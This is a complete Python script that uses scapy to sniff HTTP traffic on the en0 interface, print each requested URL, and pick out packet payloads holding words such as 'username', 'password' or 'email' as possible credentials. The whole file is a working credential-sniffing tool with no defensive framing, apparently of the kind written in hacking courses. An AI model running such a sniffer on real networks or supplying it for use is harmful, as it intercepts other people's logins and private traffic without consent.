import scapy.all as scapy
from scapy.layers import http


'''main function, calls for process sniffed packet'''
def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


'''retrieves the url from the packet'''
def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


'''retrieves any login information if keyword exists'''
def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["uname", "username", "login", "password", "pass", "email", "name"]
        for word in keywords:
            if word in str(load):
                return load


'''processes the packet and prints info'''
def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request detected >> " + str(url))
        login_info = get_login_info(packet)
        if login_info:
            print("\n[+] Possible username/password detected >> " + str(login_info) + "\n")


sniff("en0")